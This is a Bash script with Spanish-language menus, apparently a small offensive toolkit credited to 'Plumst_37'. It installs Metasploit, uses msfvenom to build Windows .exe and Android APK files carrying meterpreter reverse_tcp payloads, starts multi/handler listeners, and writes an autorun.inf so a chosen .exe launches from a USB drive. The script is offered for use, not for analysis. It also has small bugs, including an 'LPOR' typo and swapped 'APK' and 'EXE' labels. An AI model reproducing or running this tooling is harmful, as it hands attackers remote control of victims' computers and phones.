#!/bin/bash
clear

menu(){
echo
echo
echo "████████╗███████╗░██████╗████████╗░█████╗░██████╗░"
echo "╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗"
echo "░░░██║░░░█████╗░░╚█████╗░░░░██║░░░██║░░██║██████╔╝"
echo "░░░██║░░░██╔══╝░░░╚═══██╗░░░██║░░░██║░░██║██╔══██╗"
echo "░░░██║░░░███████╗██████╔╝░░░██║░░░╚█████╔╝██║░░██║"
echo "░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝"
printf "\e[1;93m       .:.:.:.\e[0m\e[1;77m Plumst_37 \e[0m\e[1;93m.:.:.:.\e[0m\n"
echo
echo
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Descargar herramientas necesarias\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Crear archivo exe malicioso para pc\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Crear archivo apk para andorid\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Poner a la escucha del archivo exe\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Poner a la escucha del archivo apk\e[0m \n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Crear servidor TCP para los archivos o HOST\e[0m  \n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Crear una USB que se ejecute automaticamente\e[0m"
echo
echo
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Seleccione una opción: \e[0m\en' opcion

case $opcion in
  1) install_metasploit ;;
  2) crear_exe ;;
  3) crear_apk;;
  4) escucha_exe;;
  5) esucha_apk;;
  6) activar_servidor;;
  7) USB_AUTORUN ;;
  *) echo "Opción inválida" ;;
esac

}

install_metasploit(){

echo "1) descargar en linux"
echo "2) descargar en termux"
echo
read -p "seleccione una opción: "

case $opcion in

1) linux;;
2) termux;;

esac

}

linux(){

	sudo apt update -y
	sudo apt upgrade -y
	sudo apt install curl
	mkdir metasploit
	cd metasploit

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
  
cd ..

rm - r metasploit

}


crear_exe(){
clear
cd archivo_exe
    while true; do
        echo -e "\e[31m\e[31mNo agregues el .exe\e[0m"
        read -p "Agrega el nombre de tu archivo exe: " nombre

        clear
        read -p "Agregar un HOST: " LHOST
        read -p "Agrega un puerto: " LPORT

        clear
        echo -e "Verifica los datos:"
        echo -e "Nombre \e[32m$nombre\e[0m"
        echo -e "LHOST: \e[32m$LHOST\e[0m"
        echo -e "LPORT: \e[32m$LPORT\e[0m"

        read -p "Los datos están bien (y/n): " datos

        case "$datos" in
            [Yy])
                echo -n "Creando APK... "
                for ((i=1; i<=10; i++)); do  # Ida
                    sleep 0.1
                    echo -n "."
                done
                for ((i=9; i>=1; i--)); do  # Vuelta
                    sleep 0.1
                    echo -n "\b \b"  # Borra el último punto
                done

                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPOR=$LPORT -f exe > $nombre.exe
                
                cd ..
                clear
                echo "Archivo creado :)"
                break
                ;;
            [Nn])
                clear
                continue
                ;;
            *) echo "Opción no válida";;
        esac
    done



}


crear_apk() {
    clear
    cd archivo_apk

    while true; do
        echo "No agregues el .apk"
        read -p "Agrega el nombre de tu archivo apk: " nombre_apk

        clear
        read -p "Agregar un HOST: " LHOST
        read -p "Agrega un puerto: " LPORT

        clear
        echo "Verifica los datos:"
        echo "LHOST: $LHOST"
        echo "LPORT: $LPORT"

        read -p "Los datos están bien (y/n): " datos

        case "$datos" in
            [Yy])
                echo -n "Creando EXE... "
                for ((i=1; i<=10; i++)); do  # Ida
                    sleep 0.1
                    echo -n "."
                done
                for ((i=9; i>=1; i--)); do  # Vuelta
                    sleep 0.1
                    echo -n "..."  # Borra el último punto
                done

                msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -o "$nombre_apk.apk"
                cd ..
                clear
                echo "Archivo creado :)"
                break
                ;;
            [Nn])
                clear
                continue
                ;;
            *) echo "Opción no válida";;
        esac
    done

}




escucha_exe() {
    clear

    while true; do
        read -p "HOST del archivo exe: " IP
        read -p "Puerto del archivo exe: " puerto

        clear
        echo "Verifica los datos:"
        echo "HOST: $IP"
        echo "Puerto: $puerto"

        read -p "Los datos están bien (y/n): " datos

        case "$datos" in
            [Yy])
                msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $puerto; exploit"
                break  # Salir del bucle si los datos son correctos
                ;;
            [Nn])
                clear
                continue  # Volver al inicio del bucle para ingresar los datos nuevamente
                ;;
            *) echo "Opción no válida";;
        esac
    done
}

esucha_apk() {
    clear

    while true; do
        read -p "HOST del archivo exe: " IP
        read -p "Puerto del archivo exe: " puerto

        clear
        echo "Verifica los datos:"
        echo "HOST: $IP"
        echo "Puerto: $puerto"

        read -p "Los datos están bien (y/n): " datos

        case "$datos" in
            [Yy])
                msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $puerto; exploit"
                break  # Salir del bucle si los datos son correctos
                ;;
            [Nn])
                clear
                continue  # Volver al inicio del bucle para ingresar los datos nuevamente
                ;;
            *) echo "Opción no válida";;
        esac
    done
}

USB_AUTORUN() {

#!/bin/bash

# 1. Detectar dispositivos USB conectados
echo "Dispositivos USB conectados:"
lsblk -o NAME,SIZE,TYPE,MOUNTPOINT | grep -E 'disk|part' | grep -v '/boot'

# 2. Pedir al usuario que seleccione la USB
read -p "Ingresa el nombre del dispositivo USB (ej. sdb1): " usb_device

# 3. Verificar si el dispositivo existe
if ! lsblk | grep -q "$usb_device"; then
    echo "El dispositivo USB no existe. Saliendo."
    exit 1
fi

# 4. Listar archivos .exe en la carpeta "archivo_exe" con números
exe_folder="/media/$USER/$usb_device/archivo_exe"

if [ -d "$exe_folder" ]; then
    echo "Archivos .exe encontrados en la carpeta 'archivo_exe':"
    exe_files=("$exe_folder"/*.exe)
    for i in "${!exe_files[@]}"; do
        echo "$((i+1)). ${exe_files[i]}"
    done

    # 5. Pedir al usuario que seleccione el archivo por número
    read -p "Selecciona el número del archivo .exe a ejecutar: " file_number
    file_path="${exe_files[file_number-1]}"

    # 6. Verificar si el archivo existe
    if [ ! -f "$file_path" ]; then
        echo "Número de archivo inválido. Saliendo."
        exit 1
    fi
else
    echo "La carpeta 'archivo_exe' no existe en la USB."
    exit 1
fi

# 7. Crear el archivo autorun.inf
autorun_path="/media/$USER/$usb_device/autorun.inf"
echo "[autorun]" > "$autorun_path"
echo "open=$file_path" >> "$autorun_path"
echo "icon=$file_path" >> "$autorun_path"  # Opcional: Agregar un ícono

echo "Archivo autorun.inf creado en la USB."

}

menu
 

